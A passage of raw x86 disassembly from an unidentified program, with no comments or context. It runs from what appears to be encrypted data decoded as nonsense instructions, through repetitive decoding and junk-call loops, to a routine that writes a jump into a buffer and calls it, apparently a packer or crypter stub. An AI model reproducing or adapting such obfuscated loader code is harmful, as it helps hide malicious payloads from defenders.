  416aca:	out    dx,eax
  416acb:	push   ebx
  416acc:	sub    al,0x9
  416ace:	jne    0x416b4d
  416ad0:	jge    0x416a60
  416ad2:	in     eax,0xdc
  416ad4:	hlt    
  416ad5:	shl    BYTE PTR [ebp-0xc178bb7],0x81
  416adc:	or     eax,0xcc5d38cb
  416ae1:	adc    DWORD PTR [ebp-0x4b],ebp
  416ae4:	cwde   
  416ae5:	jb     0x416b0c
  416ae7:	mov    bh,0x4
  416ae9:	aam    0x7b
  416aeb:	loope  0x416a7f
  416aed:	push   es
  416aee:	add    dl,BYTE PTR [edi+0x1c]
  416af1:	mov    esi,0x5c0a4ac6
  416af6:	jge    0x416ad8
  416af8:	fwait
  416af9:	out    0x2c,al
  416afb:	idiv   DWORD PTR [eax+0xf]
  416afe:	pop    ds
  416aff:	mov    esi,0x96d242e1
  416b04:	adc    ch,ah
  416b06:	mov    ecx,0x8c4af464
  416b0b:	mov    bh,0x22
  416b0d:	and    eax,DWORD PTR [esi-0x48]
  416b10:	bound  ebx,QWORD PTR [esi+eiz*1]
  416b13:	and    ah,BYTE PTR [edi-0x1d]
  416b16:	fdivr  QWORD PTR [ecx+0x38]
  416b19:	test   al,0xb0
  416b1b:	idiv   BYTE PTR [edx-0x6e]
  416b1e:	fs pop ebp
  416b20:	xchg   ebp,eax
  416b21:	push   edi
  416b22:	int3   
  416b23:	dec    esi
  416b24:	pushf  
  416b25:	sbb    ebp,esi
  416b27:	add    DWORD PTR [ecx+0x3f],ebx
  416b2a:	test   al,0x22
  416b2c:	je     0x416ae1
  416b2e:	mov    edi,0xbc8a3431
  416b33:	lock xchg ebp,eax
  416b35:	mov    ds:0xcd4135b8,eax
  416b3a:	ss inc esi
  416b3c:	(bad)  
  416b3d:	in     al,dx
  416b3e:	mov    bh,BYTE PTR [ecx]
  416b40:	push   ds
  416b41:	cmc    
  416b42:	add    DWORD PTR [ebx],esp
  416b44:	or     DWORD PTR [edi+0x327af82d],ebp
  416b4a:	push   ss
  416b4b:	test   al,0x12
  416b4d:	sahf   
  416b4e:	push   ss
  416b4f:	jno    0x416b57
  416b51:	or     ch,BYTE PTR [edx+0x4c]
  416b54:	add    bh,BYTE PTR [eax-0x63]
  416b57:	shl    DWORD PTR [eax],0x3e
  416b5a:	lea    ebx,[edi+0x65]
  416b5d:	mov    BYTE PTR [edx+0x4d],ah
  416b60:	dec    ecx
  416b61:	sub    al,0x41
  416b63:	jno    0x416bc7
  416b65:	loop   0x416bc1
  416b67:	stos   BYTE PTR es:[edi],al
  416b68:	ret    
  416b69:	and    eax,0x13ba44ce
  416b6e:	fwait
  416b6f:	arpl   WORD PTR [esi+ebx*4-0x6badd412],di
  416b76:	inc    ebp
  416b77:	and    al,0xea
  416b79:	shl    ebp,cl
  416b7b:	mov    al,ds:0xb1e7fe6
  416b80:	aaa    
  416b81:	mov    ebp,0x22f64cd5
  416b86:	adc    cl,ah
  416b88:	sub    cl,BYTE PTR [ebp-0x4e]
  416b8b:	mov    bl,0xb
  416b8d:	dec    esp
  416b8e:	je     0x416b44
  416b90:	pop    edx
  416b91:	leave  
  416b92:	nop
  416b93:	fst    st(0)
  416b95:	imul   eax,DWORD PTR [ebp-0x47],0x47
  416b99:	mov    ebp,0xda487d55
  416b9e:	in     eax,0xe8
  416ba0:	cli    
  416ba1:	arpl   WORD PTR [ecx+edi*8-0x3581252e],ax
  416ba8:	pop    ebx
  416ba9:	mov    BYTE PTR [esi-0x1],ch
  416bac:	xchg   edx,eax
  416bad:	scas   eax,DWORD PTR es:[edi]
  416bae:	mov    WORD PTR [ebp+0x12],ds
  416bb1:	data16 jg 0x416c0c
  416bb4:	add    cl,0x23
  416bb7:	mov    ds:0xf1871afb,eax
  416bbc:	sbb    ah,dh
  416bbe:	shr    BYTE PTR [ebx],cl
  416bc0:	sbb    eax,0x95d39b75
  416bc5:	stc    
  416bc6:	jo     0x416bd4
  416bc8:	cs pop esi
  416bca:	mov    bl,0x6b
  416bcc:	test   eax,0x518b0eb6
  416bd1:	add    ah,BYTE PTR [ebp-0x33]
  416bd4:	shl    BYTE PTR [eax-0x5f],cl
  416bd7:	(bad)  
  416bd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bda:	scas   eax,DWORD PTR es:[edi]
  416bdb:	ins    BYTE PTR es:[edi],dx
  416bdc:	mov    ds:0xcb61fa0c,al
  416be1:	sti    
  416be2:	sub    BYTE PTR [ecx],cl
  416be4:	fs loopne 0x416b6a
  416be7:	stos   DWORD PTR es:[edi],eax
  416be8:	jg     0x416c15
  416bea:	mov    edi,0x1262cbe8
  416bef:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  416bf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bf2:	outs   dx,BYTE PTR ds:[esi]
  416bf3:	ret    0x2947
  416bf6:	add    bl,BYTE PTR [eax-0x13bb0338]
  416bfc:	pusha  
  416bfd:	es das 
  416bff:	scas   eax,DWORD PTR es:[edi]
  416c00:	scas   eax,DWORD PTR es:[edi]
  416c01:	sbb    eax,0x809275d
  416c06:	mov    eax,0xa318eed4
  416c0b:	sbb    al,0xba
  416c0d:	lsl    esi,WORD PTR [esi+0xb0a9ea4]
  416c14:	mov    bl,0xa3
  416c16:	xchg   esi,eax
  416c17:	adc    dl,bl
  416c19:	sub    edx,DWORD PTR [edx+0x2c644fdc]
  416c1f:	scas   al,BYTE PTR es:[edi]
  416c20:	fistp  DWORD PTR [ebx+0x4f432fc5]
  416c26:	add    DWORD PTR [esi-0x1a6ed011],0xfffffff5
  416c2d:	fimul  DWORD PTR [ebx+0x6f488bc8]
  416c33:	pushw  0xe3a9
  416c37:	clc    
  416c38:	and    dh,BYTE PTR [ebp-0x69]
  416c3b:	sub    eax,0x4cc8bb86
  416c40:	mov    WORD PTR [esi+0x30a707c4],?
  416c46:	sti    
  416c47:	pusha  
  416c48:	xor    BYTE PTR [esi],cl
  416c4a:	xchg   ecx,eax
  416c4b:	aam    0x2e
  416c4d:	xor    DWORD PTR [ecx+eiz*8-0x3c],esi
  416c51:	and    DWORD PTR [ebx+0x68],edx
  416c54:	ja     0x416c08
  416c56:	xor    eax,0xeec1cc9d
  416c5b:	sbb    bh,BYTE PTR [edi+0x4abba39e]
  416c61:	push   esp
  416c62:	jecxz  0x416c8c
  416c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c65:	xor    al,0x2e
  416c67:	jae    0x416c1e
  416c69:	or     DWORD PTR [edi-0x79],eax
  416c6c:	ret    
  416c6d:	mov    ds:0x26a881db,al
  416c72:	pop    esi
  416c73:	pop    edi
  416c74:	mov    WORD PTR [ebp-0x10bcc15e],?
  416c7a:	or     DWORD PTR [ebp-0x35],edx
  416c7d:	ja     0x416c40
  416c7f:	aam    0x61
  416c81:	jbe    0x416c95
  416c83:	jo     0x416c8a
  416c85:	pop    esi
  416c86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c87:	adc    DWORD PTR [ebp-0x68],ebp
  416c8a:	enter  0xdac1,0xbc
  416c8e:	push   ss
  416c8f:	stos   BYTE PTR es:[edi],al
  416c90:	jg     0x416cd3
  416c92:	or     bh,BYTE PTR [eax+0x74137427]
  416c98:	sbb    al,0x95
  416c9a:	popa   
  416c9b:	jmp    0xf50e:0xb6eb8e71
  416ca2:	stos   BYTE PTR es:[edi],al
  416ca3:	inc    edx
  416ca4:	fild   WORD PTR [ebx+0x7f6f2b7]
  416caa:	retf   
  416cab:	xchg   esi,eax
  416cac:	pop    gs
  416cae:	out    dx,al
  416caf:	xchg   ebp,eax
  416cb0:	push   ebp
  416cb1:	inc    esi
  416cb2:	rcr    cl,1
  416cb4:	or     DWORD PTR [ecx+0x75],eax
  416cb7:	jns    0x416d25
  416cb9:	in     eax,dx
  416cba:	pop    edi
  416cbb:	js     0x416d0c
  416cbd:	repnz outs dx,DWORD PTR ds:[esi]
  416cbf:	adc    BYTE PTR [edi],al
  416cc1:	icebp  
  416cc2:	sbb    BYTE PTR [ebp-0x7b],dh
  416cc5:	mov    bh,bh
  416cc7:	inc    ebp
  416cc8:	out    0x57,eax
  416cca:	xchg   esi,eax
  416ccb:	add    al,0x30
  416ccd:	push   edi
  416cce:	icebp  
  416ccf:	out    0xa6,al
  416cd1:	mov    ebx,DWORD PTR [ebp-0x8]
  416cd4:	xor    edx,eax
  416cd6:	xor    ebx,eax
  416cd8:	sub    edx,ebx
  416cda:	sub    edx,esi
  416cdc:	xor    edx,eax
  416cde:	mov    DWORD PTR [ebp+0x8],edx
  416ce1:	mov    edx,DWORD PTR [ebp+0x8]
  416ce4:	mov    ebx,DWORD PTR [ebp-0x58]
  416ce7:	lea    edx,[ebx+edx*1+0x5708f4]
  416cee:	mov    DWORD PTR [ebp-0x58],edx
  416cf1:	mov    edx,DWORD PTR [ebp+0x8]
  416cf4:	mov    ebx,DWORD PTR [ebp-0x54]
  416cf7:	add    edx,0x64f89a
  416cfd:	imul   edx,ebx
  416d00:	mov    DWORD PTR [ebp-0x54],edx
  416d03:	mov    edx,DWORD PTR [ebp+0x8]
  416d06:	mov    ebx,DWORD PTR [ebp-0x50]
  416d09:	add    edx,0x242ebe9
  416d0f:	and    edx,ebx
  416d11:	mov    DWORD PTR [ebp-0x50],edx
  416d14:	mov    edx,DWORD PTR [ebp+0x8]
  416d17:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d1a:	add    edx,ecx
  416d1c:	or     edx,ebx
  416d1e:	mov    DWORD PTR [ebp-0x4c],edx
  416d21:	mov    edx,DWORD PTR [ebp+0x8]
  416d24:	mov    ebx,0xfdbe0321
  416d29:	sub    ebx,edx
  416d2b:	add    ebx,DWORD PTR [ebp-0x48]
  416d2e:	mov    DWORD PTR [ebp-0x48],ebx
  416d31:	mov    edx,DWORD PTR [ebp+0x8]
  416d34:	mov    ebx,DWORD PTR [ebp-0x44]
  416d37:	add    edx,edi
  416d39:	xor    edx,ebx
  416d3b:	mov    DWORD PTR [ebp-0x44],edx
  416d3e:	mov    edx,DWORD PTR [ebp+0x8]
  416d41:	xor    edx,eax
  416d43:	add    edx,esi
  416d45:	jne    0x41497b
  416d4b:	jmp    0x416dd8
  416d50:	mov    edx,DWORD PTR [ebp-0x14]
  416d53:	mov    DWORD PTR [ebp+0x8],edx
  416d56:	jmp    0x416dcb
  416d5b:	mov    edx,DWORD PTR [ebp+0x8]
  416d5e:	mov    ebx,DWORD PTR [ebp-0x8]
  416d61:	xor    edx,eax
  416d63:	xor    ebx,eax
  416d65:	sub    edx,ebx
  416d67:	sub    edx,esi
  416d69:	xor    edx,eax
  416d6b:	mov    DWORD PTR [ebp+0x8],edx
  416d6e:	mov    edx,DWORD PTR [ebp+0x8]
  416d71:	mov    ebx,DWORD PTR [ebp-0x58]
  416d74:	lea    edx,[ebx+edx*1+0x5708f4]
  416d7b:	mov    DWORD PTR [ebp-0x58],edx
  416d7e:	mov    edx,DWORD PTR [ebp+0x8]
  416d81:	mov    ebx,DWORD PTR [ebp-0x54]
  416d84:	add    edx,0x64f89a
  416d8a:	imul   edx,ebx
  416d8d:	mov    DWORD PTR [ebp-0x54],edx
  416d90:	mov    edx,DWORD PTR [ebp+0x8]
  416d93:	mov    ebx,DWORD PTR [ebp-0x50]
  416d96:	add    edx,0x242ebe9
  416d9c:	and    edx,ebx
  416d9e:	mov    DWORD PTR [ebp-0x50],edx
  416da1:	mov    edx,DWORD PTR [ebp+0x8]
  416da4:	mov    ebx,DWORD PTR [ebp-0x4c]
  416da7:	add    edx,ecx
  416da9:	or     edx,ebx
  416dab:	mov    DWORD PTR [ebp-0x4c],edx
  416dae:	mov    edx,DWORD PTR [ebp+0x8]
  416db1:	mov    ebx,0xfdbe0321
  416db6:	sub    ebx,edx
  416db8:	add    ebx,DWORD PTR [ebp-0x48]
  416dbb:	mov    DWORD PTR [ebp-0x48],ebx
  416dbe:	mov    edx,DWORD PTR [ebp+0x8]
  416dc1:	mov    ebx,DWORD PTR [ebp-0x44]
  416dc4:	add    edx,edi
  416dc6:	xor    edx,ebx
  416dc8:	mov    DWORD PTR [ebp-0x44],edx
  416dcb:	mov    edx,DWORD PTR [ebp+0x8]
  416dce:	xor    edx,eax
  416dd0:	add    edx,esi
  416dd2:	jne    0x416d5b
  416dd8:	mov    edx,DWORD PTR [ebp-0x14]
  416ddb:	mov    DWORD PTR [ebp+0x8],edx
  416dde:	jmp    0x416e53
  416de3:	mov    edx,DWORD PTR [ebp+0x8]
  416de6:	mov    ebx,DWORD PTR [ebp-0x8]
  416de9:	xor    edx,eax
  416deb:	xor    ebx,eax
  416ded:	sub    edx,ebx
  416def:	sub    edx,esi
  416df1:	xor    edx,eax
  416df3:	mov    DWORD PTR [ebp+0x8],edx
  416df6:	mov    edx,DWORD PTR [ebp+0x8]
  416df9:	mov    ebx,DWORD PTR [ebp-0x58]
  416dfc:	lea    edx,[ebx+edx*1+0x5708f4]
  416e03:	mov    DWORD PTR [ebp-0x58],edx
  416e06:	mov    edx,DWORD PTR [ebp+0x8]
  416e09:	mov    ebx,DWORD PTR [ebp-0x54]
  416e0c:	add    edx,0x64f89a
  416e12:	imul   edx,ebx
  416e15:	mov    DWORD PTR [ebp-0x54],edx
  416e18:	mov    edx,DWORD PTR [ebp+0x8]
  416e1b:	mov    ebx,DWORD PTR [ebp-0x50]
  416e1e:	add    edx,0x242ebe9
  416e24:	and    edx,ebx
  416e26:	mov    DWORD PTR [ebp-0x50],edx
  416e29:	mov    edx,DWORD PTR [ebp+0x8]
  416e2c:	mov    ebx,DWORD PTR [ebp-0x4c]
  416e2f:	add    edx,ecx
  416e31:	or     edx,ebx
  416e33:	mov    DWORD PTR [ebp-0x4c],edx
  416e36:	mov    edx,DWORD PTR [ebp+0x8]
  416e39:	mov    ebx,0xfdbe0321
  416e3e:	sub    ebx,edx
  416e40:	add    ebx,DWORD PTR [ebp-0x48]
  416e43:	mov    DWORD PTR [ebp-0x48],ebx
  416e46:	mov    edx,DWORD PTR [ebp+0x8]
  416e49:	mov    ebx,DWORD PTR [ebp-0x44]
  416e4c:	add    edx,edi
  416e4e:	xor    edx,ebx
  416e50:	mov    DWORD PTR [ebp-0x44],edx
  416e53:	mov    edx,DWORD PTR [ebp+0x8]
  416e56:	xor    edx,eax
  416e58:	add    edx,esi
  416e5a:	jne    0x416de3
  416e60:	mov    edx,DWORD PTR [ebp-0x8]
  416e63:	mov    ebx,DWORD PTR [ebp-0xc]
  416e66:	xor    edx,eax
  416e68:	lea    edx,[edx+ebx*1+0x3272fa]
  416e6f:	mov    DWORD PTR [ebp-0xc],edx
  416e72:	mov    edx,DWORD PTR [ebp-0x10]
  416e75:	xor    edx,eax
  416e77:	add    edx,esi
  416e79:	jne    0x412518
  416e7f:	jmp    0x416f96
  416e84:	mov    ecx,DWORD PTR [ebp-0x14]
  416e87:	mov    DWORD PTR [ebp+0x8],ecx
  416e8a:	jmp    0x416f03
  416e8f:	mov    ecx,DWORD PTR [ebp+0x8]
  416e92:	mov    edx,DWORD PTR [ebp-0x8]
  416e95:	xor    ecx,eax
  416e97:	xor    edx,eax
  416e99:	sub    ecx,edx
  416e9b:	sub    ecx,esi
  416e9d:	xor    ecx,eax
  416e9f:	mov    DWORD PTR [ebp+0x8],ecx
  416ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  416ea5:	mov    edx,DWORD PTR [ebp-0x58]
  416ea8:	lea    ecx,[edx+ecx*1+0x5708f4]
  416eaf:	mov    DWORD PTR [ebp-0x58],ecx
  416eb2:	mov    ecx,DWORD PTR [ebp+0x8]
  416eb5:	mov    edx,DWORD PTR [ebp-0x54]
  416eb8:	add    ecx,0x64f89a
  416ebe:	imul   ecx,edx
  416ec1:	mov    DWORD PTR [ebp-0x54],ecx
  416ec4:	mov    ecx,DWORD PTR [ebp+0x8]
  416ec7:	mov    edx,DWORD PTR [ebp-0x50]
  416eca:	add    ecx,0x242ebe9
  416ed0:	and    ecx,edx
  416ed2:	mov    DWORD PTR [ebp-0x50],ecx
  416ed5:	mov    ecx,DWORD PTR [ebp+0x8]
  416ed8:	mov    edx,DWORD PTR [ebp-0x4c]
  416edb:	add    ecx,0xf641bea
  416ee1:	or     ecx,edx
  416ee3:	mov    DWORD PTR [ebp-0x4c],ecx
  416ee6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ee9:	mov    edx,0xfdbe0321
  416eee:	sub    edx,ecx
  416ef0:	add    edx,DWORD PTR [ebp-0x48]
  416ef3:	mov    DWORD PTR [ebp-0x48],edx
  416ef6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ef9:	mov    edx,DWORD PTR [ebp-0x44]
  416efc:	add    ecx,edi
  416efe:	xor    ecx,edx
  416f00:	mov    DWORD PTR [ebp-0x44],ecx
  416f03:	mov    ecx,DWORD PTR [ebp+0x8]
  416f06:	xor    ecx,eax
  416f08:	add    ecx,esi
  416f0a:	jne    0x416e8f
  416f10:	jmp    0x416fa2
  416f15:	mov    ecx,DWORD PTR [ebp+0x8]
  416f18:	mov    edx,DWORD PTR [ebp-0x8]
  416f1b:	xor    ecx,eax
  416f1d:	xor    edx,eax
  416f1f:	sub    ecx,edx
  416f21:	sub    ecx,esi
  416f23:	xor    ecx,eax
  416f25:	mov    DWORD PTR [ebp+0x8],ecx
  416f28:	mov    ecx,DWORD PTR [ebp+0x8]
  416f2b:	mov    edx,DWORD PTR [ebp-0x58]
  416f2e:	lea    ecx,[edx+ecx*1+0x5708f4]
  416f35:	mov    DWORD PTR [ebp-0x58],ecx
  416f38:	mov    ecx,DWORD PTR [ebp+0x8]
  416f3b:	mov    edx,DWORD PTR [ebp-0x54]
  416f3e:	add    ecx,0x64f89a
  416f44:	imul   ecx,edx
  416f47:	mov    DWORD PTR [ebp-0x54],ecx
  416f4a:	mov    ecx,DWORD PTR [ebp+0x8]
  416f4d:	mov    edx,DWORD PTR [ebp-0x50]
  416f50:	add    ecx,0x242ebe9
  416f56:	and    ecx,edx
  416f58:	mov    DWORD PTR [ebp-0x50],ecx
  416f5b:	mov    ecx,DWORD PTR [ebp+0x8]
  416f5e:	mov    edx,DWORD PTR [ebp-0x4c]
  416f61:	add    ecx,0xf641bea
  416f67:	or     ecx,edx
  416f69:	mov    DWORD PTR [ebp-0x4c],ecx
  416f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f6f:	mov    edx,0xfdbe0321
  416f74:	sub    edx,ecx
  416f76:	add    edx,DWORD PTR [ebp-0x48]
  416f79:	mov    DWORD PTR [ebp-0x48],edx
  416f7c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f7f:	mov    edx,DWORD PTR [ebp-0x44]
  416f82:	add    ecx,edi
  416f84:	xor    ecx,edx
  416f86:	mov    DWORD PTR [ebp-0x44],ecx
  416f89:	mov    ecx,DWORD PTR [ebp+0x8]
  416f8c:	xor    ecx,eax
  416f8e:	add    ecx,esi
  416f90:	jne    0x416f15
  416f96:	mov    ecx,DWORD PTR [ebp-0x8]
  416f99:	xor    ecx,eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x10]
  416f9e:	add    ecx,esi
  416fa0:	mov    DWORD PTR [eax],ecx
  416fa2:	pop    edi
  416fa3:	pop    esi
  416fa4:	pop    ebx
  416fa5:	leave  
  416fa6:	ret    0xc
  416fa9:	push   ebp
  416faa:	mov    ebp,esp
  416fac:	sub    esp,0x78
  416faf:	add    DWORD PTR ds:0x426f25,0x66eb
  416fb9:	push   esi
  416fba:	mov    esi,DWORD PTR ds:0x426f55
  416fc0:	mov    eax,ds:0x428ce1
  416fc5:	sub    eax,esi
  416fc7:	imul   esi,DWORD PTR [esi+eax*1]
  416fcb:	push   edi
  416fcc:	xor    esi,esi
  416fce:	or     esi,DWORD PTR ds:0x42af45
  416fd4:	mov    esi,DWORD PTR [esi]
  416fd6:	sbb    DWORD PTR ds:0x426e8d,esi
  416fdc:	mov    eax,ds:0x4262c9
  416fe1:	mov    DWORD PTR [ebp-0x24],eax
  416fe4:	and    DWORD PTR ds:0x426eb9,0x0
  416fee:	mov    esi,DWORD PTR ds:0x426eb9
  416ff4:	inc    esi
  416ff5:	mov    DWORD PTR ds:0x426eb9,esi
  416ffb:	cmp    DWORD PTR ds:0x426eb9,0x4
  417002:	jbe    0x41703f
  417008:	jmp    0x417018
  41700d:	push   0x2f87
  417012:	call   DWORD PTR ds:0x430a2c
  417018:	cmp    DWORD PTR ds:0x426eb9,0x3
  41701f:	jne    0x417032
  417025:	mov    esi,DWORD PTR ds:0x426eb9
  41702b:	inc    esi
  41702c:	mov    DWORD PTR ds:0x426eb9,esi
  417032:	cmp    DWORD PTR ds:0x426eb9,0x19
  417039:	jb     0x416fee
  41703f:	mov    eax,ds:0x4263e9
  417044:	mov    DWORD PTR [ebp-0x30],eax
  417047:	sub    esi,esi
  417049:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  417050:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  417057:	and    DWORD PTR ds:0x426ec1,0x0
  417061:	jmp    0x417074
  417066:	xor    eax,eax
  417068:	add    eax,DWORD PTR ds:0x426ec1
  41706e:	inc    eax
  41706f:	mov    ds:0x426ec1,eax
  417074:	cmp    DWORD PTR ds:0x426ec1,0x13
  41707b:	jae    0x4170b9
  417081:	cmp    DWORD PTR ds:0x426ec1,0x5
  417088:	jg     0x4170b9
  41708e:	jmp    0x417099
  417093:	call   DWORD PTR ds:0x430a00
  417099:	cmp    DWORD PTR ds:0x426ec1,0x4
  4170a0:	jne    0x4170b4
  4170a6:	xor    eax,eax
  4170a8:	xor    eax,DWORD PTR ds:0x426ec1
  4170ae:	inc    eax
  4170af:	mov    ds:0x426ec1,eax
  4170b4:	jmp    0x417066
  4170b9:	mov    eax,DWORD PTR [ebp-0x10]
  4170bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4170bf:	sub    eax,ecx
  4170c1:	mov    ecx,DWORD PTR ds:0x428ced
  4170c7:	mov    ecx,DWORD PTR [ecx]
  4170c9:	and    DWORD PTR ds:0x426ed5,ecx
  4170cf:	mov    DWORD PTR [ebp-0x10],eax
  4170d2:	and    DWORD PTR ds:0x426ec1,0x0
  4170dc:	xor    ecx,ecx
  4170de:	or     ecx,DWORD PTR ds:0x426ec1
  4170e4:	inc    ecx
  4170e5:	mov    DWORD PTR ds:0x426ec1,ecx
  4170eb:	cmp    DWORD PTR ds:0x426ec1,0x8
  4170f2:	ja     0x417153
  4170f8:	jmp    0x41712c
  4170fd:	push   0x4411
  417102:	push   DWORD PTR [ebp-0x28]
  417105:	push   0x7cba
  41710a:	push   0x1619
  41710f:	push   DWORD PTR [ebp-0x28]
  417112:	push   0x5e18
  417117:	push   0x6c27
  41711c:	push   0x15fe
  417121:	push   0x4181
  417126:	call   DWORD PTR ds:0x430a04
  41712c:	cmp    DWORD PTR ds:0x426ec1,0x7
  417133:	jne    0x417146
  417139:	mov    ecx,DWORD PTR ds:0x426ec1
  41713f:	inc    ecx
  417140:	mov    DWORD PTR ds:0x426ec1,ecx
  417146:	cmp    DWORD PTR ds:0x426ec1,0x1b
  41714d:	jb     0x4170dc
  417153:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  41715a:	mov    edi,DWORD PTR ds:0x426e95
  417160:	xor    DWORD PTR ds:0x426e91,edi
  417166:	mov    eax,DWORD PTR [ebp-0x18]
  417169:	mov    DWORD PTR ds:0x426e89,0x1f
  417173:	cmp    DWORD PTR ds:0x426e89,0x0
  41717a:	je     0x4171aa
  417180:	cmp    DWORD PTR ds:0x426e89,0x28
  417187:	jg     0x4171aa
  41718d:	jmp    0x417198
  417192:	call   DWORD PTR ds:0x430a38
  417198:	mov    esi,DWORD PTR ds:0x426e89
  41719e:	dec    esi
  41719f:	mov    DWORD PTR ds:0x426e89,esi
  4171a5:	jmp    0x417173
  4171aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4171ad:	sbb    DWORD PTR ds:0x426e91,ebx
  4171b3:	sub    eax,ecx
  4171b5:	mov    DWORD PTR [ebp-0x18],eax
  4171b8:	sbb    ecx,DWORD PTR ds:0x426ed5
  4171be:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4171c5:	mov    eax,DWORD PTR [ebp-0xc]
  4171c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4171cb:	adc    DWORD PTR ds:0x426eed,0xa48
  4171d5:	sub    eax,ecx
  4171d7:	mov    DWORD PTR [ebp-0xc],eax
  4171da:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  4171e1:	mov    DWORD PTR ds:0x426eb9,0x1e
  4171eb:	cmp    DWORD PTR ds:0x426eb9,0x0
  4171f2:	je     0x417222
  4171f8:	cmp    DWORD PTR ds:0x426eb9,0x24
  4171ff:	jb     0x417222
  417205:	jmp    0x417210
  41720a:	call   DWORD PTR ds:0x430a08
  417210:	mov    esi,DWORD PTR ds:0x426eb9
  417216:	dec    esi
  417217:	mov    DWORD PTR ds:0x426eb9,esi
  41721d:	jmp    0x4171eb
  417222:	mov    eax,DWORD PTR [ebp-0x1c]
  417225:	mov    ecx,DWORD PTR [ebp-0x1c]
  417228:	sub    eax,ecx
  41722a:	mov    DWORD PTR [ebp-0x1c],eax
  41722d:	or     DWORD PTR [ebp-0x1c],0xf89c8595
  417234:	mov    eax,DWORD PTR [ebp-0x20]
  417237:	mov    ecx,DWORD PTR [ebp-0x20]
  41723a:	sub    eax,ecx
  41723c:	mov    DWORD PTR [ebp-0x20],eax
  41723f:	mov    eax,DWORD PTR [ebp-0x2c]
  417242:	mov    ecx,DWORD PTR [ebp-0x20]
  417245:	mov    esi,0x75108b3
  41724a:	xor    eax,esi
  41724c:	mov    edi,0x3272fa
  417251:	add    eax,edi
  417253:	or     eax,ecx
  417255:	mov    DWORD PTR [ebp-0x20],eax
  417258:	mov    eax,DWORD PTR [ebp-0x4]
  41725b:	mov    ecx,DWORD PTR [ebp-0x4]
  41725e:	sub    eax,ecx
  417260:	mov    DWORD PTR [ebp-0x4],eax
  417263:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  41726a:	mov    eax,DWORD PTR [ebp-0xc]
  41726d:	xor    eax,esi
  41726f:	add    eax,edi
  417271:	push   eax
  417272:	mov    eax,DWORD PTR [ebp-0x10]
  417275:	xor    eax,esi
  417277:	add    eax,edi
  417279:	push   eax
  41727a:	mov    eax,DWORD PTR [ebp-0x4]
  41727d:	xor    eax,esi
  41727f:	add    eax,0x3272fe
  417284:	push   eax
  417285:	lea    eax,[ebp-0x78]
  417288:	push   eax
  417289:	push   DWORD PTR [ebp-0x2c]
  41728c:	push   DWORD PTR [ebp-0x28]
  41728f:	call   0x40d3b8
  417294:	test   eax,eax
  417296:	je     0x4172c4
  41729c:	lea    eax,[ebp-0x78]
  41729f:	push   eax
  4172a0:	mov    eax,DWORD PTR [ebp-0x28]
  4172a3:	xor    eax,esi
  4172a5:	add    eax,edi
  4172a7:	push   eax
  4172a8:	mov    eax,DWORD PTR [ebp-0x24]
  4172ab:	add    eax,0xaa
  4172b0:	push   eax
  4172b1:	mov    eax,DWORD PTR [ebp-0x24]
  4172b4:	mov    eax,DWORD PTR [eax+0x198]
  4172ba:	push   DWORD PTR [eax]
  4172bc:	call   0x408594
  4172c1:	mov    DWORD PTR [ebp-0x14],eax
  4172c4:	mov    ecx,DWORD PTR ds:0x4263c1
  4172ca:	lea    eax,[ebp+0x4]
  4172cd:	mov    DWORD PTR [ecx*4+0x4263b9],eax
  4172d4:	inc    DWORD PTR ds:0x4263c1
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	test   eax,eax
  4172df:	je     0x417351
  4172e5:	lea    eax,[ebp-0x8]
  4172e8:	mov    DWORD PTR [ebp-0x34],eax
  4172eb:	mov    eax,DWORD PTR [ebp-0x30]
  4172ee:	mov    DWORD PTR [ebp-0x8],eax
  4172f1:	mov    eax,DWORD PTR [ebp-0x8]
  4172f4:	mov    ecx,DWORD PTR [ebp-0x14]
  4172f7:	sub    eax,ecx
  4172f9:	mov    DWORD PTR [ebp-0x8],eax
  4172fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4172ff:	xor    ecx,esi
  417301:	mov    eax,0xffcd8d06
  417306:	sub    eax,ecx
  417308:	add    DWORD PTR [ebp-0x8],eax
  41730b:	mov    eax,DWORD PTR [ebp-0x14]
  41730e:	mov    DWORD PTR [eax],0x675565e9
  417314:	mov    DWORD PTR [eax+0x4],0x76576787
  41731b:	mov    eax,DWORD PTR [ebp-0x8]
  41731e:	mov    ecx,DWORD PTR [ebp-0x14]
  417321:	push   DWORD PTR [ebp-0x24]
  417324:	mov    DWORD PTR [ecx+0x1],eax
  417327:	mov    eax,ds:0x426145
  41732c:	push   DWORD PTR [eax]
  41732e:	push   DWORD PTR ds:0x4263a9
  417334:	push   DWORD PTR ds:0x42614d
  41733a:	push   DWORD PTR ds:0x426389
  417340:	push   DWORD PTR ds:0x426cc9
  417346:	push   DWORD PTR [ebp-0x28]
  417349:	push   DWORD PTR [ebp-0x2c]
  41734c:	mov    eax,DWORD PTR [ebp-0x14]
  41734f:	call   eax
  417351:	pop    edi
  417352:	pop    esi
  417353:	leave  
  417354:	ret    
  417355:	push   ebp
  417356:	mov    ebp,esp
  417358:	sub    esp,0x34
  41735b:	neg    edx
  41735d:	push   ebx
  41735e:	adc    edx,ecx
  417360:	push   esi
  417361:	push   edi
  417362:	xor    ecx,0x2a8a
  417368:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  41736f:	mov    edx,DWORD PTR ds:0x429d41
  417375:	xor    esi,esi
  417377:	xor    esi,DWORD PTR ds:0x429d55
  41737d:	sub    esi,edx
